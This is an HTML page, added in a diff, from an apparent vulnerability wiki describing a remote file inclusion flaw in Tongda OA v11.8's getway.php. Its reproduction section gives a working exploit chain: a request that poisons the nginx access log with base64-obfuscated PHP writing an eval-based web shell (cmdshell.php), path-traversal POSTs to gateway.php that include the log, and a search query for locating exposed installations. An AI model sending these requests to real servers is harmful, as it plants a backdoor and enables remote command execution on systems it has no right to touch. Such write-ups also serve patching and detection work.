@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.8%20getway.php%20%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>通达OA v11.8 getway.php 远程文件包含漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u901a\u8fbeOA v11.8 getway.php \u8fdc\u7a0b\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e", url: "#_top", children: [
+              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
+              {title: "\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u7f51\u7edc\u6d4b\u7ed8", url: "#_3" },
+              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_4" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E9%80%9A%E8%BE%BEOA%20v11.8%20update.php%20%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E9%80%9A%E8%BE%BEOA%20v11.8%20update.php%20%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        通达OA v11.8 update.php 后台文件包含命令执行漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E9%80%9A%E8%BE%BEOA%20v11.8%20api.ali.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E9%80%9A%E8%BE%BEOA%20v11.8%20api.ali.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        通达OA v11.8 api.ali.php 任意文件上传漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="oa-v118-getwayphp">通达OA v11.8 getway.php 远程文件包含漏洞<a class="headerlink" href="#oa-v118-getwayphp" title="Permanent link">&para;</a></h1>
+<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>通达OA v11.8 getway.php 存在文件包含漏洞，攻击者通过发送恶意请求包含日志文件导致任意文件写入漏洞</p>
+<h2 id="_2">漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p><a-checkbox checked>通达OA v11.8</a-checkbox></br></p>
+<h2 id="_3">网络测绘<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<p><a-checkbox checked>app="TDXK-通达OA" </a-checkbox></br></p>
+<h2 id="_4">漏洞复现<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
+<p>登陆页面</p>
+<p><img alt="img" src="../../../.vuepress/public/img/1628303888717-4ffc91a6-e87e-4e00-8bd5-b2218bb0772a-20220313173009245.png" /></p>
+<p>发送恶意请求让日志被记录</p>
+<div class="highlight"><pre><span></span><code><span class="x">GET /d1a4278d?json={}&amp;aa=</span><span class="cp">&lt;?php</span> <span class="o">@</span><span class="nb">fputs</span><span class="p">(</span><span class="nb">fopen</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="s1">&#39;Y21kc2hlbGwucGhw&#39;</span><span class="p">),</span><span class="nx">w</span><span class="p">),</span><span class="nb">base64_decode</span><span class="p">(</span><span class="s1">&#39;PD9waHAgQGV2YWwoJF9QT1NUWydjbWRzaGVsbCddKTs/Pg==&#39;</span><span class="p">));</span><span class="cp">?&gt;</span><span class="x"> HTTP/1.1</span>
+<span class="x">Host: </span>
+<span class="x">User-Agent: Go-http-client/1.1</span>
+<span class="x">Accept-Encoding: gzip</span>
+</code></pre></div>
+<p><img alt="img" src="../../../.vuepress/public/img/1628304243872-a7ae1965-2e21-4551-9d92-b42a3468617b.png" /></p>
+<p>在通过漏洞包含日志文件</p>
+<div class="highlight"><pre><span></span><code><span class="x">POST /ispirit/interface/gateway.php HTTP/1.1</span>
+<span class="x">Host: </span>
+<span class="x">User-Agent: Go-http-client/1.1</span>
+<span class="x">Content-Length: 54</span>
+<span class="x">Content-Type: application/x-www-form-urlencoded</span>
+<span class="x">Accept-Encoding: gzip</span>
+
+<span class="x">json={&quot;url&quot;:&quot;/general/../../nginx/logs/oa.access.log&quot;}</span>
+</code></pre></div>
+<p><img alt="img" src="../../../.vuepress/public/img/1628304347438-754f2570-1b25-4e9e-b822-ec78c2ca944a.png" /></p>
+<p>再次发送恶意请求写入文件</p>
+<div class="highlight"><pre><span></span><code><span class="x">POST /mac/gateway.php HTTP/1.1</span>
+<span class="x">Host: </span>
+<span class="x">User-Agent: Go-http-client/1.1</span>
+<span class="x">Content-Length: 54</span>
+<span class="x">Content-Type: application/x-www-form-urlencoded</span>
+<span class="x">Accept-Encoding: gzip</span>
+
+<span class="x">json={&quot;url&quot;:&quot;/general/../../nginx/logs/oa.access.log&quot;}</span>
+</code></pre></div>
+<p><img alt="img" src="../../../.vuepress/public/img/1628304579748-4614da68-4756-43a6-b7c1-dc6e9e034819.png" /></p>
+<p>访问写入的文件 <code>/mac/cmdshell.php</code></p>
+<p><img alt="img" src="../../../.vuepress/public/img/1628304836865-aee81900-a2a1-402c-9915-77a3d908e480.png" /></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E9%80%9A%E8%BE%BEOA%20v11.8%20update.php%20%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E9%80%9A%E8%BE%BEOA%20v11.8%20update.php%20%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        通达OA v11.8 update.php 后台文件包含命令执行漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E9%80%9A%E8%BE%BEOA%20v11.8%20api.ali.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E9%80%9A%E8%BE%BEOA%20v11.8%20api.ali.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        通达OA v11.8 api.ali.php 任意文件上传漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
